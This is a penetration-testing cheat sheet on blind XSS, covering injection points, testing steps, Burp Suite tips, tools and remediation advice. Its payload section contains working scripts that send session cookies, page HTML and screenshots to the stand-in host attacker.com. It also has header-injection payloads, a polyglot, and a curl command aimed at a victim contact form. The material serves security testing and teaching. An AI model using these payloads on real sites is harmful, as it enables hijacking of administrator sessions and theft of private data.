# Blind XSS (Out-of-Band)

## Overview
Blind XSS is a variant of stored XSS where the attacker cannot directly observe whether their payload executes, because the injection point and the rendering context are in different parts of the application — typically a backend system, admin panel, log viewer, support dashboard, or internal tool the attacker cannot access. The payload is injected through a public-facing input, stored, and later fires when a privileged user (such as an administrator) views the stored data. Detection relies entirely on out-of-band callbacks to an attacker-controlled server.

## How It Works
The attacker submits a JavaScript payload into any input field that feeds data to a secondary system. That secondary system — which could be a ticket management system, user administration panel, internal reporting tool, or log aggregator — renders the data without sanitization. When a privileged user opens a record containing the payload, the script executes in their browser and sends data back to the attacker's server: session cookies, the admin page HTML, internal URLs, or screenshots. Because execution happens in a privileged context, blind XSS is extremely high value despite its indirect nature.

## Impact
- Compromise of administrator or support staff accounts
- Access to admin panels, internal dashboards, and backend systems not exposed to the public
- Exfiltration of sensitive data visible only to privileged users (PII, internal configs, other users' data)
- Lateral movement through captured admin credentials
- Full application takeover via admin session hijacking
- Disclosure of internal network topology through admin-page HTML content
- Long persistence — payload may sit dormant for days/weeks until an admin views it

## Where to Look
- Contact forms and feedback forms
- Support ticket submission systems
- Bug report or feature request forms
- "Reason for account deletion" or "cancellation feedback" fields
- User registration fields (name, company, address) displayed in admin panels
- Product reviews and ratings displayed in moderation queues
- User-agent strings and other HTTP headers logged and displayed in admin logs
- IP addresses in log viewers
- Search query logs
- API fields that feed into BI/analytics dashboards
- Webhook payloads that get displayed in a UI
- CSV/Excel import forms
- QR code or barcode data fields scanned into the system

## Testing Steps
1. Set up an out-of-band payload server — use XSS Hunter, Burp Collaborator, or a custom server with HTTPS (required for modern browsers).
2. Generate a unique payload per injection point so you can identify which field triggered the callback.
3. Inject the payload into every user-facing input that is likely reviewed by staff.
4. Include session-grabbing logic, screenshot capability, and page HTML exfiltration in the payload.
5. Also inject into HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For`, `Accept-Language`.
6. Wait for callbacks — successful execution appears as a hit on your server with the victim's data.
7. Analyze the received data: admin URL, cookies, page HTML — use this to access the admin panel or escalate further.
8. Re-test after any application updates to ensure the payload didn't get sanitized during a patch cycle.

## Payloads / Techniques

**Basic Burp Collaborator callback:**
```html
<script>new Image().src='https://YOUR-COLLABORATOR.burpcollaborator.net/?x=1'</script>
```

**XSS Hunter payload (comprehensive data collection):**
```html
"><script src=https://YOUR-SUBDOMAIN.xss.ht></script>
```

**Custom payload — cookie + URL + HTML exfiltration:**
```html
<script>
var data = {
  cookie: document.cookie,
  url: document.location.href,
  title: document.title,
  html: btoa(document.documentElement.outerHTML.substring(0, 5000))
};
fetch('https://attacker.com/blind', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify(data)
});
</script>
```

**Screenshot exfiltration using html2canvas:**
```html
<script>
var s = document.createElement('script');
s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
s.onload = function() {
  html2canvas(document.body).then(function(canvas) {
    fetch('https://attacker.com/screenshot', {
      method: 'POST',
      body: canvas.toDataURL()
    });
  });
};
document.head.appendChild(s);
</script>
```

**Payload for injection in HTTP headers (User-Agent):**
```
User-Agent: Mozilla/5.0"><script src=https://attacker.com/blind.js></script>
```

**Payload that stores in localStorage for persistence:**
```html
<script>
localStorage.setItem('xss', '1');
if(!localStorage.getItem('fired')) {
  localStorage.setItem('fired','1');
  fetch('https://attacker.com/?d='+btoa(document.cookie));
}
</script>
```

**Polyglot blind XSS payload (works across multiple contexts):**
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**cURL to test header injection:**
```bash
curl -H 'User-Agent: test"><script src="https://attacker.com/b.js"></script>' \
     -H 'X-Forwarded-For: 1.2.3.4"><script src="https://attacker.com/b.js"></script>' \
     https://victim.com/contact
```

## Burp Suite Tips
- Use **Burp Collaborator** as the callback server — it provides unique per-payload subdomains, HTTPS support, and logs all DNS/HTTP interactions.
- In **Burp Collaborator client** (Burp > Burp Collaborator client), click "Copy to clipboard" to get your unique URL and embed it in payloads.
- Use the **Intruder** module to automatically insert blind XSS payloads into every parameter of every request in scope.
- Create a **match-and-replace rule** in Proxy to inject payloads into `User-Agent` and `Referer` headers on all requests automatically.
- In **Project options > Misc > Burp Collaborator**, configure polling so you get real-time notifications of callbacks.
- Use **Logger++** extension to track which requests/parameters contained your payload when a callback arrives.
- Use **Param Miner** extension to discover hidden parameters that might be logged and displayed in admin views.

## Tools
- XSS Hunter (hosted or self-hosted) — https://xsshunter.com / https://github.com/mandatoryprogrammer/xsshunter
- Burp Suite Pro (Collaborator, Intruder)
- Blind XSS framework — https://github.com/ssl/ezXSS
- ezXSS — https://github.com/ssl/ezXSS
- interactsh — https://github.com/projectdiscovery/interactsh (alternative OOB server)
- html2canvas — https://html2canvas.hertzen.com/ (for screenshot payloads)
- RequestBin / Webhook.site (for simple callback testing)

## Remediation
- **Output encoding at render time**: Admin panels and internal dashboards are as responsible for safe output encoding as public-facing pages — treat all stored data as untrusted.
- **Input sanitization**: Apply the same sanitization rules to all inputs regardless of whether they are visible to end users or only to administrators.
- **CSP on admin panels**: Enforce a strict Content Security Policy on internal/admin applications — they are often overlooked for CSP deployment.
- **HttpOnly session cookies**: Ensure administrator session cookies are HttpOnly so they cannot be accessed by injected JavaScript.
- **Log sanitization**: When displaying raw log data (User-Agent, IP, path), HTML-encode all values before rendering in a web interface.
- **Security awareness**: Administrators should be aware that processing user-submitted data carries risk — avoid opening suspicious records in browsers without protection.
- **Regular audits**: Include internal tools and admin panels in penetration testing scope — they are commonly overlooked.

## References
https://portswigger.net/web-security/cross-site-scripting/stored
https://owasp.org/www-community/attacks/Blind_XSS
https://xsshunter.com/features
https://github.com/mandatoryprogrammer/xsshunter
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
